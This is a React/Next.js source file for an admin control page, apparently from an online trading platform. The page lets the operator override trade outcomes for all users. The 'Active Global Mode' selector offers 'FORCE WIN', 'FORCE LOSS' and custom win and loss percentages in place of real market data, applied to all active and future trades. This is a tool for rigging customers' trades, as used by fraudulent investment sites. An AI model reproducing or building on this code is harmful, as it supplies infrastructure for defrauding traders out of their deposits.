'use client';

import React, { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import {
    Settings as SettingsIcon, Globe, AlertCircle, Save,
    ChevronLeft, RefreshCw, Activity, Zap, ShieldCheck
} from 'lucide-react';
import { toast } from 'sonner';
import { useAdminAuth } from '@/hooks/use-admin-auth';
import { AdminSidebar } from '@/components/admin/admin-sidebar';
import { useRealtimeAdmin } from '@/hooks/use-realtime-admin';
import { AdminLayout } from '@/components/admin/admin-layout';
import { cn } from '@/lib/utils';

export default function TradeControlPage() {
    const router = useRouter();
    const { admin, isLoading: authLoading, hasPermission, logout: handleAuthLogout } = useAdminAuth();
    const [loading, setLoading] = useState(false);
    const [saving, setSaving] = useState(false);
    const [globalMode, setGlobalMode] = useState<string>('disabled');
    const [globalWinPercentage, setGlobalWinPercentage] = useState<string>('2.5');
    const [globalLossPercentage, setGlobalLossPercentage] = useState<string>('0.002');
    const [stats, setStats] = useState({
        totalUsers: 0,
        activeTrades: 0,
        pendingDeposits: 0,
        pendingWithdrawals: 0,
    });

    const fetchStats = async () => {
        try {
            const response = await fetch(`/api/admin/stats?t=${Date.now()}`);
            if (response.ok) {
                const data = await response.json();
                setStats(data);
            }
        } catch (error) {
            console.error('Error fetching stats:', error);
        }
    };

    const { subscribe } = useRealtimeAdmin();

    useEffect(() => {
        if (!authLoading) {
            if (!admin) {
                router.push('/admin/login');
            } else {
                fetchGlobalSettings();
                fetchStats();

                const unsubDeposit = subscribe('deposit:created', () => fetchStats());
                const unsubWithdrawal = subscribe('withdrawal:created', () => fetchStats());

                return () => {
                    unsubDeposit();
                    unsubWithdrawal();
                };
            }
        }
    }, [admin, authLoading, router, subscribe]);


    const fetchGlobalSettings = async () => {
        setLoading(true);
        try {
            const response = await fetch('/api/admin/global-trade-settings', {
                cache: 'no-store'
            });
            if (response.ok) {
                const data = await response.json();
                setGlobalMode(data.globalMode || 'disabled');
                setGlobalWinPercentage(data.globalWinPercentage || '2.5');
                setGlobalLossPercentage(data.globalLossPercentage || '0.002');
            }
        } catch (error) {
            console.error('Error fetching global settings:', error);
            toast.error('Failed to load global settings');
        } finally {
            setLoading(false);
        }
    };

    const handleSave = async () => {
        const winPercent = parseFloat(globalWinPercentage);
        const lossPercent = parseFloat(globalLossPercentage);

        if (globalMode === 'custom') {
            if (isNaN(winPercent) || winPercent < 0.01 || winPercent > 99.99) {
                toast.error('Win percentage must be between 0.01% and 99.99%');
                return;
            }
            if (isNaN(lossPercent) || lossPercent < 0.001 || lossPercent > 99.99) {
                toast.error('Loss percentage must be between 0.001% and 99.99%');
                return;
            }
        }

        setSaving(true);
        try {
            const response = await fetch('/api/admin/global-trade-settings', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    globalMode,
                    globalWinPercentage: winPercent,
                    globalLossPercentage: lossPercent,
                }),
            });

            if (response.ok) {
                toast.success('Global trade settings updated successfully');
                fetchGlobalSettings();
            } else {
                const error = await response.json();
                toast.error(error.error || 'Failed to update settings');
            }
        } catch (error) {
            console.error('Error updating global settings:', error);
            toast.error('Failed to update settings');
        } finally {
            setSaving(false);
        }
    };

    const getModeColor = (mode: string) => {
        switch (mode) {
            case 'win': return 'bg-green-100 text-green-700 border-green-300';
            case 'loss': return 'bg-red-100 text-red-700 border-red-300';
            case 'custom': return 'bg-purple-100 text-purple-700 border-purple-300';
            case 'automatic': return 'bg-blue-100 text-blue-700 border-blue-300';
            default: return 'bg-gray-100 text-gray-700 border-gray-300';
        }
    };


    return (
        <AdminLayout
            title="Market Trading Engine"
            subtitle="Centralized trade control and execution parameters"
            actions={
                <Button variant="outline" size="sm" onClick={fetchGlobalSettings} className="h-9 w-9 p-0 border-slate-200">
                    <RefreshCw className={`h-4 w-4 text-slate-500 ${loading ? 'animate-spin' : ''}`} />
                </Button>
            }
        >
            <div className="space-y-6">
                <Card className="bg-gradient-to-r from-slate-900 to-slate-800 border-none shadow-xl text-white">
                    <CardHeader className="pb-8">
                        <div className="flex items-center gap-4 mb-2">
                            <div className="p-2 bg-primary/20 rounded-xl backdrop-blur-md">
                                <ShieldCheck className="h-6 w-6 text-primary" />
                            </div>
                            <div>
                                <CardTitle className="text-2xl font-black tracking-tight">System Enforcement Engine</CardTitle>
                                <CardDescription className="text-slate-400 font-medium">Control the global outcome of trading operations across all accounts.</CardDescription>
                            </div>
                        </div>
                    </CardHeader>
                </Card>

                <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                    <Card className="lg:col-span-2 border-slate-200 shadow-sm">
                        <CardHeader className="border-b bg-slate-50/50">
                            <CardTitle className="text-lg">Execution Strategy</CardTitle>
                            <CardDescription>Define how the system handles trade outcomes</CardDescription>
                        </CardHeader>
                        <CardContent className="pt-6 min-h-[400px]">
                            <div className="space-y-8 animate-in fade-in duration-500">
                                <div className="space-y-3">
                                    <Label className="text-base font-bold text-slate-900">Active Global Mode</Label>
                                    <select
                                        value={globalMode}
                                        onChange={(e) => setGlobalMode(e.target.value)}
                                        className={`w-full px-4 py-4 text-sm font-bold rounded-lg border focus:ring-2 focus:ring-primary transition-all outline-none ${getModeColor(globalMode)}`}
                                    >
                                        <option value="disabled">🚫 DISABLED (Use User Settings)</option>
                                        <option value="automatic">⚙️ AUTOMATIC (Real Market Data)</option>
                                        <option value="win">✅ FORCE WIN (All Users Win)</option>
                                        <option value="loss">❌ FORCE LOSS (All Users Lose)</option>
                                        <option value="custom">🎯 CUSTOM (Defined Percentages)</option>
                                    </select>
                                    <p className="text-xs text-slate-500 font-medium">Determine if trades follow market logic or platform-wide bias.</p>
                                </div>

                                {globalMode === 'custom' && (
                                    <div className="p-6 rounded-xl border-2 border-purple-200 bg-purple-50/30 space-y-6 animate-in zoom-in-95 duration-200">
                                        <div className="flex items-center gap-2 text-purple-800 font-bold mb-2">
                                            <SettingsIcon className="h-5 w-5" />
                                            Custom Parameter Setup
                                        </div>

                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                            <div className="space-y-2">
                                                <Label className="text-green-700 font-semibold">Win Direction Movement (%)</Label>
                                                <div className="relative">
                                                    <Input
                                                        type="number"
                                                        value={globalWinPercentage}
                                                        onChange={(e) => setGlobalWinPercentage(e.target.value)}
                                                        className="h-10 pr-8 font-mono border-slate-200"
                                                    />
                                                    <span className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground font-bold">%</span>
                                                </div>
                                            </div>
                                            <div className="space-y-2">
                                                <Label className="text-red-700 font-semibold">Loss Direction Movement (%)</Label>
                                                <div className="relative">
                                                    <Input
                                                        type="number"
                                                        value={globalLossPercentage}
                                                        onChange={(e) => setGlobalLossPercentage(e.target.value)}
                                                        className="h-10 pr-8 font-mono border-slate-200"
                                                    />
                                                    <span className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground font-bold">%</span>
                                                </div>
                                            </div>
                                        </div>

                                        <div className="bg-white p-4 rounded-lg border border-purple-100 shadow-sm">
                                            <div className="text-[10px] font-black text-slate-400 uppercase tracking-wider mb-3">Result Example ($100 Stake)</div>
                                            <div className="grid grid-cols-2 gap-4">
                                                <div className="p-3 rounded bg-green-50 border border-green-100">
                                                    <div className="text-[10px] text-green-600 font-bold uppercase">Win Exit</div>
                                                    <div className="text-lg font-mono font-bold text-green-700">
                                                        +${(100 * (1 + parseFloat(globalWinPercentage || '0') / 100) - 100).toFixed(2)}
                                                    </div>
                                                </div>
                                                <div className="p-3 rounded bg-red-50 border border-red-100">
                                                    <div className="text-[10px] text-red-600 font-bold uppercase">Loss Exit</div>
                                                    <div className="text-lg font-mono font-bold text-red-700">
                                                        -${(100 - 100 * (1 - parseFloat(globalLossPercentage || '0') / 100)).toFixed(2)}
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                )}
                            </div>
                        </CardContent>
                        <CardFooter className="bg-slate-50/50 border-t p-4 flex justify-end gap-3">
                            <Button variant="outline" onClick={fetchGlobalSettings} disabled={saving} className="h-10 border-slate-200">Cancel</Button>
                            <Button onClick={handleSave} disabled={saving} className="bg-slate-900 hover:bg-slate-800 text-white font-bold h-10 px-8 shadow-lg shadow-slate-200">
                                {saving ? <RefreshCw className="h-4 w-4 mr-2 animate-spin" /> : <Save className="h-4 w-4 mr-2" />}
                                Commit Strategy
                            </Button>
                        </CardFooter>
                    </Card>

                    <div className="space-y-6">
                        <Card className="border-slate-200 shadow-sm overflow-hidden">
                            <CardHeader className="bg-slate-50 border-b">
                                <div className="flex items-center gap-2">
                                    <Zap className="h-4 w-4 text-amber-500" />
                                    <CardTitle className="text-sm font-bold">Execution Context</CardTitle>
                                </div>
                            </CardHeader>
                            <CardContent className="p-4 space-y-4">
                                <div className="p-3 rounded-lg bg-slate-50 border border-slate-100 flex flex-col gap-1">
                                    <span className="text-[10px] font-black text-slate-400 uppercase">Status</span>
                                    <span className="text-sm font-bold text-green-600 flex items-center gap-1.5">
                                        <div className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse" />
                                        Operational
                                    </span>
                                </div>
                                <div className="p-3 rounded-lg bg-slate-50 border border-slate-100 flex flex-col gap-1">
                                    <span className="text-[10px] font-black text-slate-400 uppercase">Targeting</span>
                                    <span className="text-sm font-bold text-slate-700 uppercase tracking-tight">Global Namespace</span>
                                </div>
                            </CardContent>
                        </Card>

                        <div className="p-6 rounded-2xl border-2 border-dashed border-slate-200 flex flex-col items-center text-center space-y-3">
                            <div className="w-12 h-12 rounded-full bg-slate-50 flex items-center justify-center">
                                <AlertCircle className="h-6 w-6 text-slate-300" />
                            </div>
                            <div className="space-y-1">
                                <p className="text-xs font-black text-slate-900 uppercase tracking-wider">Restricted Access</p>
                                <p className="text-[11px] text-slate-500 leading-relaxed font-medium">Changes to these settings take effect immediately for all active and future market trades.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </AdminLayout>
    );
}
